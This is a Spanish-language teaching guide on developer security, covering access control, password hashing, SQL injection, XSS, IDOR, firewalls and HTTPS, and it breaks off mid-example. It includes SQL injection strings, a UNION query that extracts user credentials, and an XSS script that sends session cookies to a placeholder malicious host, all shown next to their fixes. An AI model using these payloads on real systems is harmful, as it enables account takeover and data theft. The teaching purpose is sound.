# Seguridad en Redes

## 🧩 Conceptos base

| Concepto | Definición simple | Nivel técnico breve | Ejemplo real |
|---|---|---|---|
| **Permissions** | Reglas que definen quién puede hacer qué dentro de un sistema | Control de acceso basado en roles (RBAC) o listas de control de acceso (ACL) que determinan qué operaciones puede ejecutar cada usuario o proceso sobre recursos del sistema | Un usuario normal puede leer archivos pero no instalarlos; solo el administrador (`root`) puede modificar configuraciones del sistema operativo |
| **Password segura** | Una contraseña difícil de adivinar o descifrar automáticamente | Combinación de entropía alta (longitud + variedad de caracteres) almacenada con hashing robusto (bcrypt, Argon2); nunca en texto plano | `P@ssw0rd` parece segura pero es predecible; `k7#mQx!2vL9$nR` con 14 caracteres aleatorios tiene una entropía real alta y resistiría ataques de fuerza bruta por años |
| **Vulnerabilidad** | Una debilidad en el sistema que alguien podría explotar para causar daño | Fallo en código, configuración o diseño que permite comportamientos no previstos; se clasifican con el estándar CVE y se puntúan con CVSS | Un formulario web que acepta código SQL como nombre de usuario (`' OR 1=1 --`) expone toda la base de datos |
| **Intrusión** | Acceso no autorizado a un sistema por parte de alguien externo (o interno) | Ataque activo que explota una vulnerabilidad para obtener acceso, escalar privilegios o moverse lateralmente dentro de la red | Un atacante encuentra un puerto SSH abierto con credenciales por defecto y obtiene acceso root al servidor de producción |
| **Seguridad de red** | Conjunto de medidas para proteger la comunicación entre dispositivos y sistemas | Combina firewalls, cifrado en tránsito (TLS/SSL), segmentación de redes, monitoreo de tráfico (IDS/IPS) y políticas de acceso | Una empresa separa su red interna de empleados de la red de invitados y cifra todo el tráfico hacia sus servidores con HTTPS |

## 🔑 Permissions (accesos en sistemas)

### ¿Qué es Autenticación?

Es el proceso de **verificar que alguien es quien dice ser**. El sistema no sabe nada de ti todavía — solo quiere confirmar tu identidad antes de dejarte entrar.

Piénsalo como mostrar tu cédula de identidad en la puerta de un edificio. El guardia no sabe qué puedes hacer adentro, solo confirma que eres tú.

Técnicamente, la autenticación puede basarse en tres factores:
- **Algo que sabes** → contraseña, PIN
- **Algo que tienes** → token físico, código SMS (2FA)
- **Algo que eres** → huella dactilar, Face ID

### ¿Qué es Autorización?

Es el proceso de **determinar qué puede hacer alguien una vez que ya entró**. El sistema ya sabe quién eres — ahora decide qué recursos o acciones tienes permitidos.

Siguiendo la analogía: ya pasaste la puerta con tu cédula. Ahora tu credencial de empleado determina si puedes entrar a la sala de servidores, o solo a tu oficina.

Técnicamente, la autorización se implementa mediante:
- **Roles** → grupos de permisos predefinidos (admin, editor, viewer)
- **ACL** (Access Control Lists) → permisos específicos por recurso
- **Políticas** → reglas condicionales más complejas ("puede editar solo si es el autor")

### ¿Cuál es la diferencia?

| | Autenticación | Autorización |
|---|---|---|
| **Pregunta que responde** | ¿Quién eres? | ¿Qué puedes hacer? |
| **Cuándo ocurre** | Antes de entrar al sistema | Después de entrar |
| **Si falla** | No puedes ingresar | Ingresas, pero con acceso limitado |
| **Ejemplo** | Usuario y contraseña correctos | Tu rol no permite borrar registros |

> La autenticación siempre va primero. No tiene sentido preguntar qué puede hacer alguien si aún no sabes quién es.

### Ejemplo developer

#### Login → Autenticación en acción

Cuando un usuario envía su email y contraseña, el sistema:
1. Busca el email en la base de datos
2. Compara el hash de la contraseña ingresada con el hash almacenado
3. Si coincide, genera un **token** (usualmente JWT) que el usuario llevará en cada request siguiente

```
Usuario envía: { email: "ana@mail.com", password: "1234" }
Sistema responde: { token: "eyJhbGci..." }
```

Ese token es como el gafete que te dan después de mostrar tu cédula. Ya no necesitas volver a identificarte en cada piso.

#### Roles (admin/user) → Autorización en acción

Una vez que el sistema sabe quién eres, el rol define tus límites:

| Acción | Usuario normal | Admin |
|---|---|---|
| Ver su propio perfil | ✅ | ✅ |
| Editar su propio perfil | ✅ | ✅ |
| Ver perfiles de otros | ❌ | ✅ |
| Eliminar cuentas | ❌ | ✅ |
| Acceder al panel de control | ❌ | ✅ |

### Relación con APIs

En una API, autenticación y autorización operan en cada request HTTP:

**Autenticación en APIs** → El cliente envía su token en el header:
```
GET /api/users
Authorization: Bearer eyJhbGci...
```
El servidor valida ese token antes de hacer cualquier cosa. Si no es válido o no existe → `401 Unauthorized`.

**Autorización en APIs** → El servidor ya sabe quién eres, pero verifica si tu rol permite esa operación:
```
DELETE /api/users/42
→ Token válido ✅ (autenticado)
→ Rol: "user" ❌ (no autorizado para eliminar)
→ Responde: 403 Forbidden
```

> El código `401` significa "no sé quién eres". El `403` significa "sé quién eres, pero no puedes hacer eso". Esta distinción es importante en el diseño de APIs.

### Relación con sistemas con usuarios

En cualquier sistema con múltiples usuarios, estas dos capas trabajan juntas como un flujo:

```
[Usuario ingresa credenciales]
        ↓
[Autenticación: ¿es válido?]
    ↙         ↘
  No           Sí → genera sesión/token
  ↓                    ↓
Error 401      [Autorización: ¿qué puede hacer?]
                   ↙              ↘
              Permitido         Denegado
              (200 OK)        (403 Forbidden)
```

Un sistema mal diseñado autentica bien pero autoriza mal — por ejemplo, cualquier usuario autenticado puede ver la información de otros usuarios solo cambiando un ID en la URL. Esto se llama **IDOR** (Insecure Direct Object Reference) y es una de las vulnerabilidades más comunes en aplicaciones web.

## 🔒 A Good Password (lo mínimo obligatorio)

### ¿Qué hace que una contraseña sea segura?

La seguridad de una contraseña se mide por qué tan difícil es adivinarla, ya sea por un humano o por un programa automatizado. El concepto clave detrás de esto es la **entropía**: a mayor entropía, más combinaciones posibles debe probar un atacante.

Los factores que determinan una contraseña segura son:

| Factor | Malo | Bueno |
|---|---|---|
| **Longitud** | Menos de 8 caracteres | 12 caracteres o más |
| **Variedad** | Solo letras minúsculas | Mayúsculas + minúsculas + números + símbolos |
| **Predecibilidad** | Palabras del diccionario, nombres, fechas | Combinación aleatoria sin patrón |
| **Unicidad** | La misma en todos los sitios | Una diferente por cada servicio |
| **Información personal** | `maria1990`, `perro123` | Sin relación con datos reales |

Una contraseña como `Tr0ub4dor&3` parece segura visualmente pero sigue un patrón predecible (sustitución de letras por números). En cambio, una frase larga y aleatoria como `lapiz-nube-faro-tigre` tiene más entropía real y es más fácil de recordar.

> La longitud importa más que la complejidad. Una contraseña de 20 caracteres simples es más segura que una de 8 caracteres "complejos".

### ¿Por qué NO se deben guardar contraseñas en texto plano?

Guardar una contraseña en texto plano significa almacenarla exactamente como el usuario la escribió, sin ninguna transformación:

```
usuarios tabla:
email              | password
ana@mail.com       | MiPerroSeLlama123
carlos@mail.com    | futbol2024
```

El problema es estructural: **si alguien accede a esa base de datos, obtiene todas las contraseñas inmediatamente**. Esto ocurre más seguido de lo que parece — filtraciones de bases de datos, empleados con acceso interno, backups mal protegidos.

Las consecuencias van más allá del sistema comprometido:
- La mayoría de las personas reutiliza contraseñas en múltiples servicios
- El atacante puede usar esas contraseñas para acceder al email, banco, redes sociales de cada usuario
- La empresa queda legalmente expuesta y pierde la confianza de sus usuarios

> Guardar contraseñas en texto plano no es un error de principiante — es negligencia. Ningún desarrollador debería hacerlo, sin importar el tamaño del proyecto.

### ¿Qué es Hashing?

El hashing es una **transformación unidireccional**: toma un texto de entrada y produce una cadena de caracteres de longitud fija llamada **hash** o **digest**. Lo crítico es que este proceso no se puede revertir.

```
"MiPerroSeLlama123"  →  [función hash]  →  "$2b$10$X9mK3pL..."
        ↑                                           ↑
   texto original                          hash almacenado
   (no se guarda)                          (lo que va a la DB)
```

Características fundamentales del hashing:

- **Unidireccional** → no existe una función para "deshacer" el hash
- **Determinista** → el mismo input siempre produce el mismo output
- **Efecto avalancha** → un cambio mínimo en el input cambia completamente el output
- **Longitud fija** → sin importar el tamaño del input, el hash tiene siempre el mismo largo

#### Hashing simple vs Hashing con Salt

Un problema del hashing simple es que contraseñas iguales producen hashes iguales. Si dos usuarios tienen la misma contraseña, sus hashes son idénticos, lo que permite ataques con **tablas rainbow** (diccionarios precomputados de hashes comunes).

La solución es el **salt**: un valor aleatorio único que se agrega a cada contraseña antes de hashear:

```
Contraseña: "1234"
Salt único: "xK92mP" (generado aleatoriamente)

Hash final: hash("1234" + "xK92mP") → "$2b$10$xK92mP..."
```

Así, dos usuarios con la misma contraseña tienen hashes completamente distintos. El salt se guarda junto al hash (no es secreto — su función es agregar unicidad, no cifrado).

#### Algoritmos recomendados

| Algoritmo | Estado | Uso recomendado |
|---|---|---|
| **MD5** | ❌ Obsoleto | Nunca para contraseñas |
| **SHA-256** | ⚠️ No ideal | Integridad de archivos, no contraseñas |
| **bcrypt** | ✅ Vigente | Estándar actual para contraseñas |
| **Argon2** | ✅ Vigente | Mejor opción moderna (ganador PHC 2015) |

> MD5 y SHA-256 son muy rápidos — eso es bueno para verificar archivos, pero malo para contraseñas. Un atacante puede probar miles de millones de combinaciones por segundo. bcrypt y Argon2 están diseñados para ser deliberadamente lentos, lo que hace los ataques de fuerza bruta imprácticamente costosos.

### Ejemplo developer: ¿Cómo se manejan contraseñas en backend?

El flujo completo en una aplicación backend tiene dos momentos: registro y login.

#### Al registrar un usuario

```javascript
const bcrypt = require('bcrypt');

async function registrarUsuario(email, passwordTextoPlano) {
  // 1. Generar el salt (cost factor 10 = balance seguridad/velocidad)
  const salt = await bcrypt.genSalt(10);

  // 2. Hashear la contraseña con el salt
  const passwordHash = await bcrypt.hash(passwordTextoPlano, salt);

  // 3. Guardar en base de datos — NUNCA el texto plano
  await db.usuarios.create({
    email: email,
    password: passwordHash  // "$2b$10$xK92mP7Lm..."
  });
}
```

#### Al hacer login

```javascript
async function login(email, passwordIngresada) {
  // 1. Buscar usuario por email
  const usuario = await db.usuarios.findOne({ email });
  if (!usuario) return { error: "Credenciales inválidas" };

  // 2. Comparar contraseña ingresada con el hash almacenado
  const esValida = await bcrypt.compare(passwordIngresada, usuario.password);

  // 3. Responder según resultado
  if (!esValida) return { error: "Credenciales inválidas" };

  return { token: generarJWT(usuario) };
}
```

> Nótese que en el login el mensaje de error es genérico ("Credenciales inválidas") tanto si el email no existe como si la contraseña es incorrecta. Esto es intencional — decir "email no encontrado" le da información útil a un atacante.

#### Lo que nunca debe aparecer en el código

```javascript
// ❌ MAL — texto plano en base de datos
await db.create({ password: passwordTextoPlano });

// ❌ MAL — algoritmo débil
const hash = crypto.createHash('md5').update(password).digest('hex');

// ❌ MAL — comparación directa de strings
if (usuario.password === passwordIngresada) { ... }

// ✅ BIEN — siempre bcrypt.compare()
const esValida = await bcrypt.compare(passwordIngresada, usuario.password);
```

## ⚠️ Vulnerabilities (fallas reales)

### ¿Qué es una vulnerabilidad?

Una vulnerabilidad es **una debilidad en el código, configuración o diseño de un sistema que puede ser explotada para causar un comportamiento no previsto**. No es necesariamente un bug que rompe la aplicación — muchas veces la app funciona perfectamente, pero permite que alguien haga cosas que no debería poder hacer.

La diferencia importante:

| | Bug normal | Vulnerabilidad |
|---|---|---|
| **Efecto** | La app falla o se comporta mal | La app funciona, pero de forma insegura |
| **Lo detecta** | El desarrollador o QA | Un atacante (o un auditor de seguridad) |
| **Consecuencia** | Experiencia de usuario mala | Pérdida de datos, acceso no autorizado, daño real |

> Una aplicación puede pasar todos sus tests y aun así tener vulnerabilidades críticas. Por eso la seguridad es una disciplina aparte del desarrollo funcional.

### Tipos comunes de vulnerabilidades

#### 1. SQL Injection (SQLi)

**¿Qué es?**
Ocurre cuando la aplicación construye consultas SQL usando directamente el input del usuario, sin validarlo. El atacante "inyecta" código SQL propio dentro de la consulta legítima.

**¿Cómo funciona?**

Supón que el backend construye esta consulta para el login:

```sql
-- Lo que el developer escribió:
"SELECT * FROM usuarios WHERE email = '" + email + "' AND password = '" + password + "'"

-- Con inputs normales:
SELECT * FROM usuarios WHERE email = 'ana@mail.com' AND password = '1234'

-- Con input malicioso en el campo email:
-- El atacante escribe:  ' OR '1'='1' --
SELECT * FROM usuarios WHERE email = '' OR '1'='1' --' AND password = '...'
```

La condición `'1'='1'` siempre es verdadera. El `--` comenta el resto de la consulta. Resultado: el atacante entra al sistema **sin conocer ninguna contraseña**.

Ataques más destructivos pueden:
- Extraer toda la base de datos
- Eliminar tablas completas (`DROP TABLE usuarios`)
- Modificar registros arbitrariamente

**¿Cómo se previene?**

```javascript
// ❌ MAL — concatenación directa
const query = `SELECT * FROM usuarios WHERE email = '${email}'`;

// ✅ BIEN — consultas parametrizadas (prepared statements)
const query = `SELECT * FROM usuarios WHERE email = ?`;
db.execute(query, [email]);
```

Con consultas parametrizadas, el input del usuario nunca se interpreta como código SQL — siempre se trata como dato.

#### 2. XSS — Cross-Site Scripting

**¿Qué es?**
Ocurre cuando la aplicación muestra en el navegador contenido ingresado por el usuario **sin sanitizarlo**, permitiendo que un atacante inyecte código JavaScript que se ejecuta en el navegador de otras personas.

A diferencia del SQL Injection que ataca el servidor, XSS **ataca al usuario final**.

**¿Cómo funciona?**

Un campo de comentarios guarda lo que el usuario escribe y lo muestra a todos:

```html
<!-- El atacante escribe esto como "comentario": -->
<script>
  document.location = 'https://sitio-malicioso.com/robar?cookie=' + document.cookie
</script>

<!-- La app lo guarda y lo muestra sin filtrar: -->
<div class="comentario">
  <script>document.location = 'https://sitio-malicioso.com/robar?cookie=' + document.cookie</script>
</div>
```

Cuando cualquier otro usuario carga esa página, el script se ejecuta en su navegador y envía sus cookies de sesión al atacante. Con esa cookie, el atacante puede **suplantar la identidad de la víctima** sin necesitar su contraseña.

**¿Cómo se previene?**

```javascript
// ❌ MAL — renderizar HTML sin filtrar
elemento.innerHTML = comentarioDelUsuario;

// ✅ BIEN — escapar caracteres especiales
elemento.textContent = comentarioDelUsuario;

// ✅ BIEN — usar librerías de sanitización si se necesita HTML
import DOMPurify from 'dompurify';
elemento.innerHTML = DOMPurify.sanitize(comentarioDelUsuario);
```

#### 3. Exposición de Datos Sensibles

**¿Qué es?**
Ocurre cuando información confidencial queda accesible a quienes no deberían verla — ya sea por mala configuración, falta de cifrado, o respuestas de API demasiado detalladas.

No requiere un ataque sofisticado. A veces basta con mirar.

**Formas comunes en que ocurre:**

```javascript
// ❌ MAL — API devuelve TODO el objeto usuario
GET /api/usuarios/42
→ {
    id: 42,
    nombre: "Ana García",
    email: "ana@mail.com",
    password: "$2b$10$xK92...",   // ← hash expuesto
    tarjeta_credito: "4111111111111111",  // ← dato sensible
    role: "admin",
    token_interno: "xK92mP..."   // ← token expuesto
  }

// ✅ BIEN — devolver solo lo necesario
→ {
    id: 42,
    nombre: "Ana García",
    email: "ana@mail.com"
  }
```

Otras formas de exposición:
- **Logs con datos sensibles** → guardar contraseñas o tokens en archivos de log
- **URLs con información privada** → `https://app.com/reset?token=abc123&email=ana@mail.com`
- **Mensajes de error detallados** → mostrar stack traces o queries SQL en producción
- **Variables de entorno en repositorios** → subir `.env` con claves de API a GitHub

> En 2019, Facebook almacenó cientos de millones de contraseñas en texto plano en logs internos — accesibles para miles de empleados. Nunca hubo un "hackeo": la exposición fue interna y por mala práctica.

### Ejemplo real: cómo una mala validación rompe una app

Escenario: una aplicación de e-commerce permite buscar productos por ID.

```javascript
// ❌ Sin ninguna validación
app.get('/api/productos/:id', async (req, res) => {
  const id = req.params.id;
  const producto = await db.query(`SELECT * FROM productos WHERE id = ${id}`);
  res.json(producto);
});
```

**Ataque 1 — SQL Injection:**
```
GET /api/productos/1 OR 1=1
→ Devuelve TODOS los productos, incluyendo los no publicados
```

**Ataque 2 — Extracción de datos de otra tabla:**
```
GET /api/productos/1 UNION SELECT email,password,null,null FROM usuarios
→ Devuelve emails y hashes de todos los usuarios
```

**Ataque 3 — Input inesperado que rompe la app:**
```
GET /api/productos/abc
→ Error SQL sin manejar → stack trace expuesto en la respuesta
→ El atacante ve la estructura interna de la base de datos
```

**La versión segura:**
```javascript
// ✅ Con validación, consulta parametrizada y manejo de errores
app.get('/api/productos/:id', async (req, res) => {
  const id = parseInt(req.params.id);

  // Validar que sea un número entero positivo
  if (isNaN(id) || id <= 0) {
    return res.status(400).json({ error: "ID inválido" });
  }

  try {
    // Consulta parametrizada — nunca concatenación
    const producto = await db.execute(
      'SELECT id, nombre, precio, descripcion FROM productos WHERE id = ?',
      [id]
    );

    if (!producto) return res.status(404).json({ error: "No encontrado" });

    res.json(producto);
  } catch (error) {
    // Error genérico — nunca exponer detalles internos
    console.error(error); // solo en logs internos
    res.status(500).json({ error: "Error interno del servidor" });
  }
});
```

La diferencia entre las dos versiones no es el funcionamiento — ambas "sirven productos". La diferencia es que una le abre la puerta al atacante y la otra no.

## 🚨 Intrusión (ataques)

### ¿Qué es una intrusión?

Una intrusión es **el acceso no autorizado a un sistema, red o aplicación**, generalmente aprovechando una vulnerabilidad existente. No es un accidente ni un error del sistema — es una acción deliberada de alguien que quiere estar donde no debería.

Es importante distinguir los tipos de actores:

| Término | Quién es | Qué hace |
|---|---|---|
| **Hacker ético (White hat)** | Profesional de seguridad contratado | Busca vulnerabilidades para reportarlas y corregirlas |
| **Atacante (Black hat)** | Actor malicioso | Explota vulnerabilidades para beneficio propio |
| **Insider threat** | Empleado o usuario interno | Abusa de su acceso legítimo |
| **Script kiddie** | Atacante sin conocimiento técnico real | Usa herramientas automatizadas de terceros |

Una intrusión no siempre implica romper cosas visiblemente. Los atacantes más peligrosos son los que entran, toman lo que necesitan y **se van sin que nadie lo note**.

### ¿Qué busca un atacante?

Los motivaciones varían, pero los objetivos más comunes son:

#### Financiero (el más frecuente)
- Robar datos de tarjetas de crédito para venderlos
- Acceder a cuentas bancarias o billeteras digitales
- Instalar ransomware y pedir rescate para devolver el acceso
- Vender bases de datos de usuarios en mercados clandestinos

#### Información y espionaje
- Robar propiedad intelectual o secretos comerciales
- Obtener datos personales para extorsión
- Acceder a comunicaciones privadas
- Espionaje corporativo o gubernamental

#### Disrupción
- Tirar servicios críticos (ataques DDoS)
- Destruir datos o infraestructura
- Dañar la reputación de una empresa o persona

#### Acceso como recurso
- Usar los servidores comprometidos para minar criptomonedas
- Convertir la máquina en parte de una botnet (red de equipos infectados usados para otros ataques)
- Usar el sistema como punto de salto hacia sistemas más valiosos

> Muchos ataques no tienen como objetivo final la aplicación que comprometen — la usan como trampolín para llegar a algo más valioso.

### ¿Qué pasa si una app es comprometida?

Las consecuencias operan en tres niveles:

#### Impacto técnico inmediato
- Exfiltración de datos (robo silencioso de información)
- Modificación o eliminación de registros en base de datos
- Instalación de malware o backdoors para mantener acceso futuro
- Interrupción del servicio

#### Impacto en el negocio
- Costos de respuesta al incidente y recuperación
- Multas regulatorias (en Europa, el GDPR puede multar hasta el 4% de la facturación anual global)
- Pérdida de contratos y clientes
- Caída del valor de mercado en empresas públicas

#### Impacto en usuarios
- Robo de identidad con sus datos personales
- Pérdidas económicas directas
- Exposición de información privada o sensible
- Daño reputacional para los afectados

> El costo promedio global de una filtración de datos en 2023 fue de USD 4,45 millones, según IBM. Y eso sin contar el daño reputacional a largo plazo.

### Ejemplo 1 — Robo de datos

**Escenario:** Una tienda online guarda datos de tarjetas de crédito en su base de datos sin cifrar.

```
[Atacante encuentra SQL Injection en el buscador de productos]
          ↓
[Extrae tabla completa de pagos]
          ↓
[Obtiene: nombre, número de tarjeta, CVV, fecha de vencimiento]
          ↓
[Vende los datos en foros clandestinos a $5–$50 por tarjeta]
          ↓
[Compradores usan las tarjetas para compras fraudulentas]
```

Lo más grave: **entre el ataque y el descubrimiento pueden pasar meses**. El promedio global de tiempo para detectar una brecha es de 204 días. Durante todo ese tiempo los datos siguen siendo explotados.

El caso real más conocido de este tipo fue **Target (2013)**: 40 millones de tarjetas robadas a través de un proveedor externo con acceso a su red. El vector de entrada no fue ni siquiera la tienda en sí — fue el sistema de aire acondicionado de un subcontratista.

### Ejemplo 2 — Acceso no autorizado

**Escenario:** Una aplicación SaaS con múltiples clientes tiene un endpoint vulnerable.

```javascript
// ❌ Endpoint sin verificación de propiedad
app.get('/api/facturas/:id', autenticar, async (req, res) => {
  // Solo verifica que el usuario esté logueado
  // NO verifica que la factura le pertenezca
  const factura = await db.facturas.findById(req.params.id);
  res.json(factura);
});
```

El atacante, siendo un usuario legítimo, simplemente itera IDs:

```
GET /api/facturas/1001  → factura de otro cliente ✅ (accede)
GET /api/facturas/1002  → factura de otro cliente ✅ (accede)
GET /api/facturas/1003  → factura de otro cliente ✅ (accede)
...
```

Esto se llama **IDOR — Insecure Direct Object Reference**, y es una de las vulnerabilidades más frecuentes según OWASP. No requiere ningún conocimiento técnico avanzado — solo cambiar un número en la URL.

**La versión segura:**

```javascript
// ✅ Verificar que el recurso pertenece al usuario autenticado
app.get('/api/facturas/:id', autenticar, async (req, res) => {
  const factura = await db.facturas.findById(req.params.id);

  if (!factura) return res.status(404).json({ error: "No encontrada" });

  // Verificación crítica: ¿esta factura es de este usuario?
  if (factura.clienteId !== req.usuario.id) {
    return res.status(403).json({ error: "Acceso denegado" });
  }

  res.json(factura);
});
```

### El ciclo de un ataque real

La mayoría de intrusiones siguen un patrón conocido como **Cyber Kill Chain**:

```
1. RECONOCIMIENTO
   El atacante estudia el objetivo
   (subdominios, tecnologías usadas, empleados en LinkedIn)
          ↓
2. WEAPONIZACIÓN
   Prepara el exploit o herramienta de ataque
          ↓
3. ENTREGA
   Envía el ataque (email de phishing, request malicioso, etc.)
          ↓
4. EXPLOTACIÓN
   La vulnerabilidad es activada
          ↓
5. INSTALACIÓN
   Instala backdoor para mantener acceso
          ↓
6. COMANDO Y CONTROL
   Controla el sistema comprometido de forma remota
          ↓
7. ACCIÓN SOBRE OBJETIVOS
   Roba datos, cifra archivos, se mueve lateralmente
```

Como developer, tu trabajo defensivo ocurre principalmente en las etapas 3 y 4 — que es donde el código que escribes determina si el ataque prospera o no.

## 🌐 Network Security (seguridad en red)

### ¿Qué protege la seguridad de red?

La seguridad de red protege **el canal por donde viajan los datos** — no el dato en sí mismo almacenado, sino el dato mientras se mueve de un punto a otro. Es la diferencia entre proteger una caja fuerte (seguridad de datos) y proteger el camión blindado que la transporta (seguridad de red).

Específicamente, busca garantizar tres propiedades durante la transmisión:

| Propiedad | Significado | Sin ella... |
|---|---|---|
| **Confidencialidad** | Solo el emisor y receptor pueden leer los datos | Cualquiera en la red puede interceptar y leer la información |
| **Integridad** | Los datos llegan exactamente como fueron enviados | Un atacante puede modificar los datos en tránsito sin que nadie lo note |
| **Disponibilidad** | El servicio responde cuando se necesita | Ataques DDoS pueden tumbar el sistema para todos |

Los vectores que protege incluyen:
- Tráfico entre el navegador del usuario y el servidor
- Comunicación entre servicios internos (microservicios, bases de datos)
- Acceso remoto a servidores e infraestructura
- Transferencia de archivos y backups

### ¿Qué es un Firewall?

Un firewall es **un sistema que filtra el tráfico de red según reglas predefinidas**, decidiendo qué conexiones se permiten y cuáles se bloquean. Actúa como un portero que revisa cada paquete de datos que entra o sale.

```
INTERNET                    FIREWALL                    RED INTERNA
   │                           │                             │
   ├── puerto 443 (HTTPS) ──→  ✅ permitido  ──────────────→ │
   ├── puerto 80  (HTTP)  ──→  ✅ permitido  ──────────────→ │
   ├── puerto 22  (SSH)   ──→  ⚠️ solo IPs autorizadas ───→ │
   ├── puerto 3306 (MySQL)──→  ❌ bloqueado                  │
   └── puerto 27017(Mongo)──→  ❌ bloqueado                  │
```

El principio fundamental del firewall es **denegar todo por defecto y permitir solo lo necesario** — no al revés.

#### Tipos de firewall

| Tipo | Qué hace | Nivel de protección |
|---|---|---|
| **Red (Network firewall)** | Filtra tráfico entre redes completas | Básico — trabaja con IPs y puertos |
| **Aplicación (WAF)** | Analiza el contenido HTTP/HTTPS | Alto — detecta SQL Injection, XSS, etc. |
| **Host-based** | Corre en el servidor mismo | Complementario — última línea de defensa |

> Un WAF (Web Application Firewall) es especialmente relevante para developers — es el que entiende HTTP y puede detectar payloads maliciosos en requests antes de que lleguen a tu aplicación.

### ¿Qué es HTTPS y por qué es importante?

HTTP es el protocolo base de comunicación en la web. El problema es que HTTP transmite todo en **texto plano** — cualquier persona con acceso a la red puede leer exactamente lo que se envía y recibe.

HTTPS es HTTP con una capa de cifrado encima llamada **TLS (Transport Layer Security)**. Todo lo que viaja entre el cliente y el servidor va cifrado.

#### Qué pasa sin HTTPS

```
Usuario escribe su contraseña en un café con WiFi público

Sin HTTPS — lo que viaja por la red:
POST /login
email=ana@mail.com&password=MiContraseña123

← Cualquiera en esa red WiFi puede ver esto con Wireshark
   (herramienta gratuita de análisis de red)
```

#### Qué pasa con HTTPS

```
Con HTTPS — lo que viaja por la red:
▒▓█▒░▓▒█░▓▒▓▒█░▓▒█░▓▒▓▒█░▓▒

← Solo el servidor con la clave privada puede descifrar esto
```

#### Cómo funciona TLS (simplificado)

```
1. CLIENTE → SERVIDOR: "Hola, quiero conectarme de forma segura"
         ↓
2. SERVIDOR → CLIENTE: "Aquí está mi certificado (identidad verificada)"
         ↓
3. CLIENTE verifica que el certificado es legítimo
   (emitido por una autoridad de certificación confiable)
         ↓
4. Ambos negocian una clave de cifrado compartida
   (sin enviarla directamente por la red)
         ↓
5. Todo el tráfico posterior va cifrado con esa clave
```

El certificado TLS cumple dos funciones simultáneamente:
- **Cifra** la comunicación
- **Autentica** que el servidor es realmente quien dice ser (evita que un atacante se haga pasar por el servidor real)

#### HTTP vs HTTPS

| | HTTP | HTTPS |
|---|---|---|
| **Cifrado** | ❌ No | ✅ Sí (TLS) |
| **Autenticación del servidor** | ❌ No | ✅ Sí (certificado) |
| **Integridad de datos** | ❌ No | ✅ Sí |
| **SEO (Google)** | Penalizado | Favorecido |
| **Navegadores modernos** | Marca como "No seguro" | Candado verde |
| **Puerto por defecto** | 80 | 443 |

### Ejemplo developer: ¿Por qué usar HTTPS en APIs?

Una API sin HTTPS no es solo un problema del frontend — es un problema de seguridad estructural para todo el sistema.

#### Escenario 1 — API móvil sin HTTPS

```
App móvil  →  HTTP  →  API servidor

Lo que viaja:
GET /api/usuarios/perfil
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

← El token JWT viaja en texto plano
← Cualquiera en la red puede capturarlo
← Con ese token, el atacante tiene acceso completo a la sesión
   sin necesitar usuario ni contraseña
```

#### Escenario 2 — Ataque Man-in-the-Middle (MitM)

Sin HTTPS, un atacante puede posicionarse entre el cliente y el servidor e interceptar o modificar la comunicación sin que ninguno de los dos lo sepa:

```
CLIENTE  ←──── red ────→  ATACANTE  ←──── red ────→  SERVIDOR

El atacante puede:
→ Leer todos los datos en tránsito
→ Modificar requests antes de que lleguen al servidor
→ Modificar responses antes de que lleguen al cliente
→ Inyectar contenido malicioso en la respuesta
```

Con HTTPS este ataque no funciona — el atacante intercepta datos cifrados que no puede leer ni modificar sin la clave privada del servidor.

#### Escenario 3 — API interna "privada" sin HTTPS

Un error común es pensar que las APIs internas no necesitan HTTPS porque "no son públicas":

```javascript
// ❌ Pensamiento peligroso:
// "Esta API solo la consume nuestro frontend interno,
//  no necesita HTTPS"

// El problema: si alguien compromete CUALQUIER punto de la red interna,
// puede ver todo el tráfico entre servicios

// Microservicio A  →  HTTP  →  Microservicio B
//                         ↑
//              Un atacante que entró por otro vector
//              ahora puede leer comunicación interna
```

#### Las buenas prácticas para HTTPS en APIs

```javascript
// 1. Forzar HTTPS — redirigir HTTP a HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    return res.redirect(`https://${req.header('host')}${req.url}`);
  }
  next();
});

// 2. HSTS — decirle al navegador que SIEMPRE use HTTPS
app.use((req, res, next) => {
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains'
  );
  next();
});

// 3. Nunca mezclar contenido HTTP en páginas HTTPS
// ❌ <img src="http://cdn.ejemplo.com/foto.jpg">
// ✅ <img src="https://cdn.ejemplo.com/foto.jpg">
```

> En 2024, tener HTTPS no es opcional ni un "plus de seguridad" — es el mínimo esperado. Servicios como Let's Encrypt ofrecen certificados TLS gratuitos y automatizados, eliminando cualquier excusa para no usarlo.

## 💻 Conexión directa con desarrollo

### ¿Qué errores comunes cometen los developers?

La mayoría de vulnerabilidades en producción no vienen de ataques sofisticados — vienen de errores predecibles y evitables. La causa raíz casi siempre es la misma: **priorizar que funcione sobre que sea seguro**.

#### Error 1 — Confiar en el input del usuario

El error más frecuente y más costoso. Asumir que los datos que llegan al servidor son lo que deberían ser.

```javascript
// ❌ "El frontend ya valida, para qué validar de nuevo"
app.post('/transferir', async (req, res) => {
  const monto = req.body.monto; // podría ser -1000, "DROP TABLE", 999999999
  await banco.transferir(monto);
});

// ✅ Validar siempre en el backend, independiente del frontend
app.post('/transferir', async (req, res) => {
  const monto = parseFloat(req.body.monto);
  if (isNaN(monto) || monto <= 0 || monto > limite) {
    return res.status(400).json({ error: "Monto inválido" });
  }
  await banco.transferir(monto);
});
```

> La validación del frontend es UX. La validación del backend es seguridad. Son cosas distintas con propósitos distintos — una no reemplaza a la otra.

#### Error 2 — Credenciales en el código

Subir claves de API, contraseñas de bases de datos o tokens directamente en el código fuente. Es más común de lo que parece — GitHub tiene bots que escanean repositorios públicos buscando exactamente esto.

```javascript
// ❌ Credenciales hardcodeadas
const db = mysql.connect({
  host: 'prod-server.aws.com',
  password: 'MiPasswordDeProduccion123',
  apiKey: 'sk-live-xK92mP7Lm...'
});

// ✅ Variables de entorno
const db = mysql.connect({
  host: process.env.DB_HOST,
  password: process.env.DB_PASSWORD,
  apiKey: process.env.API_KEY
});
```

Y el `.env` nunca va al repositorio:
```
# .gitignore
.env
.env.production
.env.local
```

> En 2022, un desarrollador de Samsung subió código interno a GitHub con credenciales reales. El repositorio era público. Las claves fueron comprometidas antes de que alguien lo notara.

#### Error 3 — Mensajes de error demasiado informativos

Los errores detallados son útiles para el developer — y también para el atacante.

```javascript
// ❌ Expone estructura interna
try {
  await db.query(sql);
} catch (error) {
  res.status(500).json({
    error: error.message,
    // "You have an error in your SQL syntax near 'usuarios' at line 1"
    stack: error.stack
    // → le dice al atacante qué base de datos usas,
